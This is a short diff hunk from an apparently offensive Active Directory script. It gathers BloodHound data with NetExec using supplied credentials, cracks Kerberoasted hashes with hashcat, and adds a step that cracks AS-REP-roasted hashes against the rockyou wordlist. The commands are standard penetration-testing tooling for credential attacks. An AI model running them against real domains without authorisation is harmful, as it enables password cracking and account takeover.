@@ -76,6 +76,9 @@ nxc ldap $target -u "$username" -p "$password" --bloodhound --collection ALL
 echo "Start Cracking Kerberoastable Hashes"
 hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt -O
 
+echo "Start Cracking Asrepoastable Hashes"
+hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt -O
+
 
 
  
